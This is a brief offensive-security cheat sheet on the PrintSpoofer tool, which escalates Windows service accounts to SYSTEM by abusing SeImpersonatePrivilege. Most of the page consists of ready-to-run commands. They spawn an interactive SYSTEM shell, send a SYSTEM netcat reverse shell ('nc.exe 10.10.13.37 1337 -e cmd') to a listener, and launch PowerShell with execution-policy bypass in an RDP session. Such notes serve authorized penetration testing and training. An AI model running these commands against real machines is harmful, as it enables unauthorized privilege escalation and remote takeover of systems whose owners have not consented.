# Printspoofer / SEImpersonate

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

#### From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.

{% embed url="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" %}

### Spawn a SYSTEM process and interact with it

If you have an interactive shell, you can create a new SYSTEM process in your current console.

```text
PrintSpoofer.exe -i -c cmd
```

### Spawn a SYSTEM process and exit

If you can execute commands but you don't have an interactive shell, you can create a new SYSTEM process and exit immediately without interacting with it.

Use case: WinRM, WebShell, wmiexec.py, smbexec.py, etc.

```text
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

Netcat listener:

```text
nc.exe -l -p 1337
```

### Spawn a SYSTEM process on a desktop

If you are logged on locally or via RDP \(including VDI\), you can spawn a SYSTEM command prompt on your desktop. First, check your session ID with the command qwinsta and then specify this value with the option -d.

Use case: Terminal Session \(RDP\), VDI

```text
qwinsta

# check your session ID

PrintSpoofer.exe -d [rdp session id number] -c "powershell -ep bypass"

PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
```

